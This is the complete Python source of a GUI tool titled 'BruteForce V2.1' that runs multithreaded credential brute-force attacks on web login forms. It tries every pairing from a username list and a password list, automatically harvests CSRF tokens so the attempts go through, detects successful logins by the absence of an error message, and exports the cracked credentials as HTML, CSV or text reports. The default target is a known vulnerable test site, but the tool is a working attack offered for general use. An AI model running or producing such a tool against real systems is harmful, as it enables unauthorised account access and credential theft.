#################################################################################
# Title:        Enhanced Login Weakness Scanner with GUI and Reporting          #
# Author:       lgp                                                             #
#                                                                               #
# Version:      2.1                                                             #
# Description:  A multi-threaded login brute-force tool that tests a list of    #
#               usernames against a list of passwords. Features a Tkinter GUI,  #
#               advanced reporting, and improved flexibility for pentesting.    #
#################################################################################

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import requests
import re
from bs4 import BeautifulSoup
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import csv
from datetime import datetime

# --- Core Scanner Logic ---
class LoginWeakScanner:
    """
    Handles the core logic for scanning a login form.
    It's designed to be run in a separate thread from the GUI.
    """
    def __init__(self, settings, output_queue, stop_event):
        self.settings = settings
        self.output_queue = output_queue
        self.stop_event = stop_event
        self.session = requests.Session()
        self.found_credentials = [] # Can now store multiple found pairs
        self.scan_summary = {} # For final reporting

    def log(self, message):
        """Puts a message into the queue to be displayed on the GUI."""
        self.output_queue.put(message)

    def get_csrf_token(self, content):
        """
        Extracts a CSRF token from the page content.
        This is more efficient as it doesn't make a new request per password.
        """
        try:
            soup = BeautifulSoup(content, 'html.parser')
            if self.settings['csrf_name']:
                csrf_field = soup.find('input', attrs={'name': self.settings['csrf_name']})
                if csrf_field and csrf_field.has_attr('value'):
                    return csrf_field['name'], csrf_field['value']
            csrf_field = soup.find('input', attrs={'name': re.compile(r'csrf|token|_token', re.I)})
            if csrf_field and csrf_field.has_attr('value'):
                return csrf_field['name'], csrf_field['value']
            match = re.search(r'name=["\'](_csrf|csrf_token|CSRF|token)["\'] value=["\'](.*?)["\']', str(content))
            if match:
                return match.group(1), match.group(2)
            return None, None
        except Exception as e:
            self.log(f"[ERROR] Could not parse for CSRF token: {e}")
            return None, None

    def attempt_login(self, username, password, csrf_name, csrf_value):
        """Attempts a single login with a given username and password."""
        if self.stop_event.is_set():
            return None

        try:
            data_dict = {
                self.settings['user_field']: username,
                self.settings['pass_field']: password
            }
            if csrf_name and csrf_value:
                data_dict[csrf_name] = csrf_value

            response = self.session.post(self.settings['url'], data=data_dict, timeout=10)

            if self.settings['error_message'].lower() not in str(response.content).lower():
                self.log("\n" + "="*60)
                self.log(f"[+] SUCCESS! Credentials Found!")
                self.log(f"[+] Username: {username}")
                self.log(f"[+] Password: {password}")
                self.log("="*60 + "\n")
                return (username, password)
            return None
        except requests.exceptions.RequestException as e:
            self.log(f"[ERROR] Network error for {username}/{password}: {e}")
            return None

    def run_scan(self):
        """Main method to execute the scanning process."""
        self.log("[*] Starting scan...")
        
        try:
            self.log(f"[*] Fetching login page: {self.settings['url']}")
            initial_response = self.session.get(self.settings['url'], timeout=10)
            initial_content = initial_response.content
        except requests.exceptions.RequestException as e:
            self.log(f"[FATAL] Failed to connect to URL: {e}")
            self.log("[!] Scan aborted.")
            self.output_queue.put(None) # Signal completion
            return

        csrf_name, csrf_value = self.get_csrf_token(initial_content)
        if csrf_name and csrf_value:
            self.log(f"[+] Found CSRF Token: Name='{csrf_name}', Value='{csrf_value[:15]}...'")
        else:
            self.log("[-] No CSRF token found. Proceeding without one.")
        
        # Load usernames and passwords
        try:
            with open(self.settings['userlist'], 'r', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
            self.log(f"[*] Loaded {len(usernames)} usernames from {self.settings['userlist']}.")
        except FileNotFoundError:
            self.log(f"[FATAL] Usernames file not found: {self.settings['userlist']}")
            self.output_queue.put(None)
            return
            
        try:
            with open(self.settings['wordlist'], 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.log(f"[*] Loaded {len(passwords)} passwords from {self.settings['wordlist']}.")
        except FileNotFoundError:
            self.log(f"[FATAL] Password file not found: {self.settings['wordlist']}")
            self.output_queue.put(None)
            return

        if not usernames or not passwords:
            self.log("[FATAL] Usernames or passwords file is empty.")
            self.output_queue.put(None)
            return
        
        combinations = [(u, p) for u in usernames for p in passwords]
        total_attempts = len(combinations)
        self.log(f"[*] Starting brute-force with {self.settings['threads']} threads. Total attempts: {total_attempts}")
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.settings['threads']) as executor:
            future_to_combo = {executor.submit(self.attempt_login, user, pswd, csrf_name, csrf_value): (user, pswd) for user, pswd in combinations}
            
            for i, future in enumerate(as_completed(future_to_combo)):
                if self.stop_event.is_set():
                    self.log("[*] Stop signal received. Cancelling remaining tasks...")
                    break

                user, pswd = future_to_combo[future]
                self.log(f"[*] Attempt {i+1}/{total_attempts}: User='{user}', Pass='{pswd}'")
                
                try:
                    result = future.result()
                    if result:
                        self.found_credentials.append(result)
                        # Optional: stop after first found credential
                        # self.stop_event.set() 
                except Exception:
                    pass # Errors are logged inside the thread

        end_time = time.time()
        self.log(f"\n[*] Scan finished in {end_time - start_time:.2f} seconds.")
        
        self.scan_summary = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'url': self.settings['url'],
            'status': 'Success' if self.found_credentials else 'Failed',
            'found_pairs': self.found_credentials,
        }
        self.output_queue.put(self.scan_summary)
        self.output_queue.put(None) # End signal


# --- GUI Application ---
class ScannerGUI(tk.Tk):
    """
    The main GUI window for the application.
    Manages user input, controls, and displays output.
    """
    def __init__(self):
        super().__init__()
        self.title("BruteForce V2.1")
        self.geometry("800x700")

        self.scanner_thread = None
        self.stop_event = threading.Event()
        self.output_queue = queue.Queue()
        self.scan_summary = None

        self.create_widgets()
        self.after(100, self.process_queue)

    def create_widgets(self):
        main_frame = ttk.Frame(self, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        settings_frame = ttk.LabelFrame(main_frame, text="Scan Configuration", padding="10")
        settings_frame.pack(fill=tk.X, expand=False)
        settings_frame.columnconfigure(1, weight=1)

        ttk.Label(settings_frame, text="Target URL:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.url_entry = ttk.Entry(settings_frame, width=80)
        self.url_entry.insert(0, "http://testphp.vulnweb.com/login.php")
        self.url_entry.grid(row=0, column=1, sticky=tk.EW, padx=5)

        ttk.Label(settings_frame, text="Login Error Msg:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.error_entry = ttk.Entry(settings_frame)
        self.error_entry.insert(0, "Invalid credentials")
        self.error_entry.grid(row=1, column=1, sticky=tk.EW, padx=5)

        ttk.Label(settings_frame, text="Usernames File:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.userlist_entry = ttk.Entry(settings_frame)
        self.userlist_entry.grid(row=2, column=1, sticky=tk.EW, padx=5)
        ttk.Button(settings_frame, text="Browse...", command=self.browse_userlist).grid(row=2, column=2, padx=5)

        ttk.Label(settings_frame, text="Passwords File:").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.wordlist_entry = ttk.Entry(settings_frame)
        self.wordlist_entry.grid(row=3, column=1, sticky=tk.EW, padx=5)
        ttk.Button(settings_frame, text="Browse...", command=self.browse_wordlist).grid(row=3, column=2, padx=5)

        advanced_frame = ttk.LabelFrame(main_frame, text="Advanced Configuration", padding="10")
        advanced_frame.pack(fill=tk.X, expand=False, pady=10)
        advanced_frame.columnconfigure(1, weight=1)
        advanced_frame.columnconfigure(3, weight=1)

        ttk.Label(advanced_frame, text="Threads:").grid(row=0, column=0, sticky=tk.W, pady=2, padx=5)
        self.threads_spinbox = ttk.Spinbox(advanced_frame, from_=1, to=100, width=5)
        self.threads_spinbox.set(10)
        self.threads_spinbox.grid(row=0, column=1, sticky=tk.W, padx=5)
        
        ttk.Label(advanced_frame, text="User Field:").grid(row=1, column=0, sticky=tk.W, pady=2, padx=5)
        self.user_field_entry = ttk.Entry(advanced_frame)
        self.user_field_entry.insert(0, "username")
        self.user_field_entry.grid(row=1, column=1, sticky=tk.EW, padx=5)

        ttk.Label(advanced_frame, text="Pass Field:").grid(row=1, column=2, sticky=tk.W, pady=2, padx=5)
        self.pass_field_entry = ttk.Entry(advanced_frame)
        self.pass_field_entry.insert(0, "password")
        self.pass_field_entry.grid(row=1, column=3, sticky=tk.EW, padx=5)

        ttk.Label(advanced_frame, text="CSRF Token Name:").grid(row=2, column=0, sticky=tk.W, pady=2, padx=5)
        self.csrf_name_entry = ttk.Entry(advanced_frame)
        self.csrf_name_entry.grid(row=2, column=1, sticky=tk.EW, padx=5)
        ttk.Label(advanced_frame, text="(Leave empty for auto-detect)").grid(row=2, column=2, sticky=tk.W, columnspan=2, padx=5)

        output_frame = ttk.LabelFrame(main_frame, text="Live Output", padding="10")
        output_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.output_text = scrolledtext.ScrolledText(output_frame, state='disabled', wrap=tk.WORD, bg="#2b2b2b", fg="#d3d3d3", font=("Consolas", 10))
        self.output_text.pack(fill=tk.BOTH, expand=True)

        control_frame = ttk.Frame(main_frame, padding="5")
        control_frame.pack(fill=tk.X, expand=False)
        control_frame.columnconfigure(0, weight=1)
        control_frame.columnconfigure(1, weight=1)
        control_frame.columnconfigure(2, weight=1)

        self.start_button = ttk.Button(control_frame, text="Start Scan", command=self.start_scan)
        self.start_button.grid(row=0, column=0, padx=5, pady=5, sticky=tk.EW)

        self.stop_button = ttk.Button(control_frame, text="Stop Scan", command=self.stop_scan, state='disabled')
        self.stop_button.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)

        self.export_button = ttk.Button(control_frame, text="Export Report", command=self.export_report, state='disabled')
        self.export_button.grid(row=0, column=2, padx=5, pady=5, sticky=tk.EW)

    def browse_userlist(self):
        filename = filedialog.askopenfilename(title="Select a Usernames File", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
        if filename:
            self.userlist_entry.delete(0, tk.END)
            self.userlist_entry.insert(0, filename)

    def browse_wordlist(self):
        filename = filedialog.askopenfilename(title="Select a Passwords File", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
        if filename:
            self.wordlist_entry.delete(0, tk.END)
            self.wordlist_entry.insert(0, filename)

    def start_scan(self):
        settings = {
            'url': self.url_entry.get().strip(),
            'error_message': self.error_entry.get().strip(),
            'userlist': self.userlist_entry.get().strip(),
            'wordlist': self.wordlist_entry.get().strip(),
            'threads': int(self.threads_spinbox.get()),
            'user_field': self.user_field_entry.get().strip(),
            'pass_field': self.pass_field_entry.get().strip(),
            'csrf_name': self.csrf_name_entry.get().strip(),
        }

        if not all([settings['url'], settings['error_message'], settings['userlist'], settings['wordlist']]):
            messagebox.showerror("Input Error", "Please fill in all configuration fields.")
            return

        self.output_text.config(state='normal')
        self.output_text.delete('1.0', tk.END)
        self.output_text.config(state='disabled')
        self.scan_summary = None
        self.stop_event.clear()

        self.start_button.config(state='disabled')
        self.stop_button.config(state='normal')
        self.export_button.config(state='disabled')

        scanner = LoginWeakScanner(settings, self.output_queue, self.stop_event)
        self.scanner_thread = threading.Thread(target=scanner.run_scan, daemon=True)
        self.scanner_thread.start()

    def stop_scan(self):
        if self.scanner_thread and self.scanner_thread.is_alive():
            self.log_message("[!] Sending stop signal to scanner...")
            self.stop_event.set()
        self.stop_button.config(state='disabled')

    def process_queue(self):
        try:
            while True:
                msg = self.output_queue.get_nowait()
                if msg is None: # End signal from thread
                    self.scan_finished()
                    break
                elif isinstance(msg, dict): # Final summary object
                    self.scan_summary = msg
                else: # Regular log message
                    self.log_message(msg)
        except queue.Empty:
            pass
        self.after(100, self.process_queue)

    def log_message(self, message):
        self.output_text.config(state='normal')
        self.output_text.insert(tk.END, str(message) + "\n")
        self.output_text.see(tk.END)
        self.output_text.config(state='disabled')
    
    def scan_finished(self):
        if not self.stop_event.is_set():
            self.log_message("\n--- Scan Complete ---")
        self.start_button.config(state='normal')
        self.stop_button.config(state='disabled')
        if self.scan_summary:
            self.export_button.config(state='normal')

    def export_report(self):
        if not self.scan_summary:
            messagebox.showerror("Error", "No scan results available to export.")
            return

        filename = filedialog.asksaveasfilename(title="Save Report", defaultextension=".html", filetypes=(("HTML Report", "*.html"), ("CSV File", "*.csv"), ("Text File", "*.txt")))
        if not filename:
            return
        
        raw_log = self.output_text.get('1.0', tk.END)
        file_ext = filename.split('.')[-1].lower()

        try:
            if file_ext == 'html':
                self.generate_html_report(filename, self.scan_summary, raw_log)
            elif file_ext == 'csv':
                self.generate_csv_report(filename, self.scan_summary)
            elif file_ext == 'txt':
                self.generate_txt_report(filename, self.scan_summary, raw_log)
            else:
                messagebox.showerror("Error", f"Unsupported file extension: {file_ext}")
                return
            messagebox.showinfo("Success", f"Report saved to {filename}")
        except Exception as e:
            messagebox.showerror("Export Error", f"Failed to save report: {e}")

    def generate_html_report(self, filename, data, raw_log):
        found_pairs_html = "".join(f"<tr><td>{u}</td><td>{p}</td></tr>" for u, p in data['found_pairs']) or '<tr><td colspan="2">None</td></tr>'
        html_content = f"""
        <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Scan Report</title><style>
            body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 960px; margin: 20px auto; }}
            .container {{ background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }}
            h1, h2 {{ color: #333; border-bottom: 2px solid #f0f0f0; padding-bottom: 5px; }}
            table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
            th, td {{ padding: 12px; border: 1px solid #ddd; text-align: left; }}
            th {{ background-color: #f2f2f2; }}
            .status-success {{ color: #2e7d32; font-weight: bold; }} .status-failed {{ color: #c62828; font-weight: bold; }}
            pre {{ background: #2b2b2b; color: #f1f1f1; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }}
        </style></head><body><div class="container">
            <h1>Login Scan Report</h1><p><strong>Generated:</strong> {data['timestamp']}</p>
            <h2>Summary</h2><table>
                <tr><th>URL</th><td>{data['url']}</td></tr>
                <tr><th>Status</th><td class="status-{'success' if data['status'] == 'Success' else 'failed'}">{data['status']}</td></tr>
            </table>
            <h2>Found Credentials</h2><table><thead><tr><th>Username</th><th>Password</th></tr></thead><tbody>{found_pairs_html}</tbody></table>
            <h2>Full Scan Log</h2><pre>{raw_log}</pre>
        </div></body></html>
        """
        with open(filename, 'w', encoding='utf-8') as f: f.write(html_content)

    def generate_csv_report(self, filename, data):
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Timestamp', 'URL', 'Status', 'FoundUsername', 'FoundPassword'])
            if data['found_pairs']:
                for u, p in data['found_pairs']:
                    writer.writerow([data['timestamp'], data['url'], data['status'], u, p])
            else:
                writer.writerow([data['timestamp'], data['url'], data['status'], 'N/A', 'N/A'])

    def generate_txt_report(self, filename, data, raw_log):
        found_pairs_txt = "\n".join(f"  - Username: {u}, Password: {p}" for u, p in data['found_pairs']) or "  None"
        txt_content = f"""
=======================================
 Login Weakness Scan Report
=======================================
Timestamp: {data['timestamp']}
Target URL: {data['url']}
Status: {data['status']}

Found Credentials:
{found_pairs_txt}
=======================================

Full Scan Log:
---------------------------------------
{raw_log}
        """
        with open(filename, 'w', encoding='utf-8') as f: f.write(txt_content.strip())


if __name__ == '__main__':
    app = ScannerGUI()
    app.mainloop()
